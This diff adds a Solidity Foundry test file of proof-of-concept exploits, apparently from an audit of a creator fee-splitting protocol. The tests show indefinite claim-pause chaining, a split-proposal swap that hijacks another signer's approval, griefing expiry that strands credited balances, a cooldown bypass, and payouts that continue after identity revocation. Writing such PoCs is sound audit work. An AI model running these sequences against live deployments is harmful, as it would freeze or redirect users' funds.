@@ -1,0 +1,279 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
+
+import {Test} from "forge-std/Test.sol";
+
+import {Registry}          from "contracts/Registry.sol";
+import {FeeVaultFactory}   from "contracts/FeeVaultFactory.sol";
+import {FeeVault}          from "contracts/FeeVault.sol";
+import {IdentityAttestor}  from "contracts/IdentityAttestor.sol";
+import {PayoutRouter}      from "contracts/PayoutRouter.sol";
+import {MockLaunchpadAdapter} from "contracts/test-helpers/MockLaunchpadAdapter.sol";
+import {MockERC20}     from "contracts/test-helpers/MockERC20.sol";
+import {MockLaunchpad} from "contracts/test-helpers/MockLaunchpad.sol";
+
+contract NodPoC is Test {
+    MockERC20 usdc;
+    FeeVaultFactory factory;
+    IdentityAttestor attestor;
+    Registry registry;
+    PayoutRouter router;
+    MockLaunchpad launchpad;
+    MockLaunchpadAdapter adapter;
+
+    address admin = makeAddr("admin");
+    address timelockAddr = makeAddr("timelock");
+    address pauser = makeAddr("pauser");
+    address treasury = makeAddr("treasury");
+    address buyback = makeAddr("buyback");
+    address fallbackAddr = makeAddr("fallback");
+    address attesterAddr; uint256 attesterKey;
+    address creatorWallet = makeAddr("creatorWallet");
+    address A = makeAddr("A");
+    address B = makeAddr("B");
+    address griefer = makeAddr("griefer");
+
+    bytes32 PLATFORM = keccak256("nod");
+    bytes32 CREATOR_ID = keccak256("creator1");
+    address tokenA = makeAddr("tokenA");
+    address tokenB = makeAddr("tokenB");
+
+    function setUp() public {
+        (attesterAddr, attesterKey) = makeAddrAndKey("attester");
+        usdc = new MockERC20("USDC", "USDC", 6);
+        factory = new FeeVaultFactory(admin, address(usdc), 0);
+        attestor = new IdentityAttestor(admin, attesterAddr, pauser);
+        launchpad = new MockLaunchpad();
+        adapter = new MockLaunchpadAdapter(address(launchpad));
+        registry = new Registry(address(usdc), address(factory), address(attestor), treasury, buyback,
+            timelockAddr, admin, pauser, 1000, fallbackAddr);
+        router = new PayoutRouter(address(registry), address(attestor), address(usdc), admin);
+        vm.prank(admin); factory.setRegistry(address(registry));
+        vm.startPrank(admin);
+        registry.grantRole(keccak256("PAYOUT_ROUTER_ROLE"), address(router));
+        vm.stopPrank();
+        vm.prank(timelockAddr); registry.setAdapterWhitelist(address(adapter), true);
+        _attest(CREATOR_ID, creatorWallet, "n1");
+        vm.warp(block.timestamp + 7 days + 1);
+    }
+
+    function _attest(bytes32 id, address wallet, bytes32 nonce) internal {
+        uint48 expiry = uint48(block.timestamp + 30 days);
+        (, string memory name, string memory version, uint256 chainId, address verifying,,) = attestor.eip712Domain();
+        bytes32 domain = keccak256(abi.encode(
+            keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
+            keccak256(bytes(name)), keccak256(bytes(version)), chainId, verifying));
+        bytes32 sh = keccak256(abi.encode(attestor.ATTESTATION_TYPEHASH(), PLATFORM, id, wallet, expiry, nonce));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attesterKey, keccak256(abi.encodePacked("\x19\x01", domain, sh)));
+        attestor.attest(PLATFORM, id, wallet, expiry, nonce, abi.encodePacked(r, s, v));
+    }
+
+    function _splits2(address r1, uint16 b1, address r2, uint16 b2) internal pure returns (Registry.SplitInput[] memory s) {
+        s = new Registry.SplitInput[](2);
+        s[0] = Registry.SplitInput(r1, b1); s[1] = Registry.SplitInput(r2, b2);
+    }
+    function _splits1(address r1) internal pure returns (Registry.SplitInput[] memory s) {
+        s = new Registry.SplitInput[](1);
+        s[0] = Registry.SplitInput(r1, 10_000);
+    }
+
+    function _register(address tkn, bytes32 creatorId, Registry.SplitInput[] memory s) internal returns (address vault) {
+        (address predicted,) = factory.predictVaultAddress(address(this), tkn);
+        launchpad.setFeeRecipient(tkn, predicted);
+        launchpad.setLocked(tkn, true);
+        registry.registerToken(tkn, address(adapter), creatorId, s, fallbackAddr, bytes32("lp"));
+        vault = registry.vaultOf(tkn);
+    }
+
+    // Both recipients accepted, each with 450 credited.
+    function _setupTwoAccepted() internal returns (address vault) {
+        vault = _register(tokenA, CREATOR_ID, _splits2(A, 5000, B, 5000));
+        vm.prank(creatorWallet); registry.accept(tokenA);
+        vm.prank(A); registry.acceptSplit(tokenA, 0);
+        vm.prank(B); registry.acceptSplit(tokenA, 1);
+        usdc.mint(vault, 1000e6);
+        registry.distributeIncoming(tokenA);
+        assertEq(FeeVault(payable(vault)).claimable(A), 450e6);
+        assertEq(FeeVault(payable(vault)).claimable(B), 450e6);
+    }
+
+    // 1. pauseClaims can be re-armed indefinitely -> claims frozen far beyond 72h.
+    function test_PoC_ClaimPauseChaining() public {
+        _setupTwoAccepted();
+        vm.prank(pauser); registry.pauseClaims();
+        skip(71 hours);
+        vm.prank(pauser); registry.pauseClaims(); // re-arm while still paused
+        skip(71 hours);
+        vm.prank(pauser); registry.pauseClaims();
+        skip(58 hours); // 200h after the first pause, still frozen
+        vm.prank(A);
+        vm.expectRevert(Registry.ClaimsPausedTooLong.selector);
+        router.claim(tokenA, 0);
+        // Even with a gap, the pauser can re-pause immediately after an auto-lift.
+        skip(15 hours); // 73h after the last pause: lifts on next claim
+        vm.prank(pauser); registry.pauseClaims();
+        vm.prank(A);
+        vm.expectRevert(Registry.ClaimsPausedTooLong.selector);
+        router.claim(tokenA, 0);
+    }
+
+    // 2. signSplitsChange doesn't bind to proposal content: A swaps the proposal under B's signature.
+    function test_PoC_SplitProposalSwap() public {
+        address vault = _setupTwoAccepted();
+        // Agreed change 60/40, A signs it.
+        vm.prank(A); registry.proposeSplitsChange(tokenA, _splits2(A, 6000, B, 4000));
+        vm.prank(A); registry.signSplitsChange(tokenA);
+        // Before B's signature lands, A replaces the proposal and re-signs.
+        vm.prank(A); registry.proposeSplitsChange(tokenA, _splits1(A));
+        vm.prank(A); registry.signSplitsChange(tokenA);
+        // B signs, believing it approves 60/40.
+        vm.prank(B); registry.signSplitsChange(tokenA);
+        assertEq(registry.splitCountOf(tokenA), 1);
+        (address r0, uint16 bps0,,) = registry.getSplit(tokenA, 0);
+        assertEq(r0, A); assertEq(bps0, 10_000);
+        // 3. B's 450 credited is now stranded: no split index lets B claim it.
+        vm.prank(B); vm.expectRevert(); router.claim(tokenA, 0);
+        vm.prank(B); vm.expectRevert(); router.claim(tokenA, 1);
+        assertEq(FeeVault(payable(vault)).claimable(B), 450e6);
+    }
+
+    // 4. Splits change after the 14-day deadline: new PENDING recipients can be expired at once
+    //    by anyone; their previously credited balances become unclaimable, future fees go 50/50.
+    function test_PoC_SplitChangeAfterDeadlineGrief() public {
+        address vault = _setupTwoAccepted();
+        vm.warp(block.timestamp + 15 days);
+        vm.prank(A); registry.proposeSplitsChange(tokenA, _splits2(A, 5000, B, 5000));
+        vm.prank(A); registry.signSplitsChange(tokenA);
+        vm.prank(B); registry.signSplitsChange(tokenA); // applied; both now PENDING
+        vm.startPrank(griefer);
+        registry.expireSplitRecipient(tokenA, 0);
+        registry.expireSplitRecipient(tokenA, 1);
+        vm.stopPrank();
+        vm.prank(A); vm.expectRevert(); registry.acceptSplit(tokenA, 0);
+        vm.prank(A); vm.expectRevert(); router.claim(tokenA, 0);
+        assertEq(FeeVault(payable(vault)).claimable(A), 450e6); // frozen
+        uint256 tBefore = usdc.balanceOf(treasury) + usdc.balanceOf(buyback);
+        usdc.mint(vault, 1000e6);
+        registry.distributeIncoming(tokenA);
+        assertEq(usdc.balanceOf(treasury) + usdc.balanceOf(buyback) - tBefore, 1000e6);
+    }
+
+    // 5. EXPIRED -> ACCEPTED: fees accrued (undistributed) while PENDING/EXPIRED go to splits, not 50/50.
+    function test_PoC_ExpiredAcceptCapturesProtocolShare() public {
+        address vault = _register(tokenA, CREATOR_ID, _splits1(A));
+        usdc.mint(vault, 1000e6);
+        vm.warp(block.timestamp + 15 days);
+        registry.expire(tokenA);
+        vm.prank(creatorWallet); registry.accept(tokenA); // EXPIRED -> ACCEPTED, no flush
+        vm.prank(A); registry.acceptSplit(tokenA, 0);
+        assertEq(FeeVault(payable(vault)).claimable(A), 900e6);
+        assertEq(usdc.balanceOf(treasury) + usdc.balanceOf(buyback), 100e6); // only the 10% fee
+    }
+
+    // 5b. REFUSED -> ACCEPTED after 30d: fees received while REFUSED (not yet pushed) go to splits.
+    function test_PoC_RefusedAcceptCapturesFallbackShare() public {
+        address vault = _register(tokenA, CREATOR_ID, _splits1(A));
+        vm.prank(creatorWallet); registry.refuse(tokenA);
+        usdc.mint(vault, 1000e6); // fees during REFUSED, nobody distributes
+        vm.warp(block.timestamp + 31 days);
+        vm.prank(creatorWallet); registry.accept(tokenA);
+        vm.prank(A); registry.acceptSplit(tokenA, 0);
+        assertEq(FeeVault(payable(vault)).claimable(A), 900e6);
+        assertEq(usdc.balanceOf(fallbackAddr), 0);
+    }
+
+    // 6. refuse() skips the first-claim cooldown that accept() enforces.
+    function test_PoC_RefuseSkipsCooldown() public {
+        bytes32 freshId = keccak256("fresh");
+        address freshWallet = makeAddr("freshWallet");
+        _attest(freshId, freshWallet, "n2");
+        address vault = _register(tokenA, freshId, _splits1(A));
+        usdc.mint(vault, 1000e6);
+        vm.prank(freshWallet); vm.expectRevert(); registry.accept(tokenA);
+        vm.prank(freshWallet); registry.refuse(tokenA); // succeeds immediately
+        registry.distributeIncoming(tokenA);
+        assertEq(usdc.balanceOf(fallbackAddr), 1000e6);
+    }
+
+    // 7. Split recipients can be expired before the token is even accepted; a creator who
+    //    attests late (cooldown pushes accept past day 14) ends up with every share EXPIRED.
+    function test_PoC_SplitsExpiredBeforeTheyCanAccept() public {
+        bytes32 lateId = keccak256("late");
+        address lateWallet = makeAddr("lateWallet");
+        address vault = _register(tokenA, lateId, _splits1(A));
+        vm.warp(block.timestamp + 10 days);
+        _attest(lateId, lateWallet, "n3");
+        vm.warp(block.timestamp + 4 days + 1); // past the 14-day deadline
+        vm.startPrank(griefer);
+        registry.expire(tokenA);
+        registry.expireSplitRecipient(tokenA, 0); // token not ACCEPTED; A could never have accepted
+        vm.stopPrank();
+        vm.warp(block.timestamp + 3 days);
+        vm.prank(lateWallet); registry.accept(tokenA);
+        vm.prank(A); vm.expectRevert(); registry.acceptSplit(tokenA, 0);
+        usdc.mint(vault, 1000e6);
+        registry.distributeIncoming(tokenA);
+        assertEq(usdc.balanceOf(treasury) + usdc.balanceOf(buyback), 1000e6);
+    }
+
+    // 8. Registry pause blocks accept() but not expire(): pausing forces expiry.
+    function test_PoC_PauseAsymmetry() public {
+        _register(tokenA, CREATOR_ID, _splits1(A));
+        vm.warp(block.timestamp + 13 days);
+        vm.prank(pauser); registry.pause();
+        vm.warp(block.timestamp + 2 days);
+        vm.prank(creatorWallet); vm.expectRevert(); registry.accept(tokenA);
+        vm.prank(griefer); registry.expire(tokenA);
+        vm.prank(griefer); registry.expireSplitRecipient(tokenA, 0);
+        assertEq(uint256(registry.getTokenState(tokenA)), uint256(Registry.TokenState.EXPIRED));
+    }
+
+    // 9. Nonce-based salt: predicting two tokens at the same nonce; registering one makes the
+    //    other's predicted vault undeployable (push-model fees there are lost).
+    function test_PoC_NonceInvalidatesPrediction() public {
+        (address predA,) = factory.predictVaultAddress(address(this), tokenA);
+        (address predB,) = factory.predictVaultAddress(address(this), tokenB);
+        launchpad.setFeeRecipient(tokenA, predA); launchpad.setLocked(tokenA, true);
+        launchpad.setFeeRecipient(tokenB, predB); launchpad.setLocked(tokenB, true);
+        usdc.mint(predB, 777e6); // launchpad paid fees to B's fixed recipient
+        registry.registerToken(tokenA, address(adapter), CREATOR_ID, _splits1(A), fallbackAddr, bytes32("lp"));
+        vm.expectRevert(abi.encodeWithSelector(Registry.AdapterRejected.selector, tokenB, address(adapter)));
+        registry.registerToken(tokenB, address(adapter), CREATOR_ID, _splits1(A), fallbackAddr, bytes32("lp"));
+        assertEq(predB.code.length, 0);
+        assertEq(usdc.balanceOf(predB), 777e6);
+    }
+
+    // 10. Duplicate recipient address -> splits change can never collect enough signatures.
+    function test_PoC_DuplicateRecipientDeadlocksSplitsChange() public {
+        _register(tokenA, CREATOR_ID, _splits2(A, 5000, A, 5000));
+        vm.prank(creatorWallet); registry.accept(tokenA);
+        vm.prank(A); registry.proposeSplitsChange(tokenA, _splits1(A));
+        vm.prank(A); registry.signSplitsChange(tokenA);
+        vm.prank(A);
+        vm.expectRevert(abi.encodeWithSelector(Registry.SplitChangeAlreadySigned.selector, tokenA, A));
+        registry.signSplitsChange(tokenA);
+        assertEq(registry.splitCountOf(tokenA), 2);
+    }
+
+    // 11. Revoked identity: the recipient wallet keeps claiming and accruing.
+    function test_PoC_RevokeDoesNotStopPayouts() public {
+        address vault = _register(tokenA, CREATOR_ID, _splits1(creatorWallet));
+        vm.prank(creatorWallet); registry.accept(tokenA);
+        vm.prank(creatorWallet); registry.acceptSplit(tokenA, 0);
+        vm.prank(attesterAddr); attestor.revoke(CREATOR_ID);
+        assertEq(attestor.walletOf(CREATOR_ID), address(0));
+        usdc.mint(vault, 1000e6);
+        vm.prank(creatorWallet); uint256 got = router.claim(tokenA, 0);
+        assertEq(got, 900e6);
+    }
+
+    // 12. batchClaim reverts wholesale on one bad entry (docs say failures are swallowed).
+    function test_PoC_BatchClaimNotIsolated() public {
+        _setupTwoAccepted();
+        address[] memory toks = new address[](2);
+        uint8[] memory idx = new uint8[](2);
+        toks[0] = tokenA; idx[0] = 0;
+        toks[1] = makeAddr("unregistered"); idx[1] = 0;
+        vm.prank(A); vm.expectRevert(); router.batchClaim(toks, idx);
+    }
+}
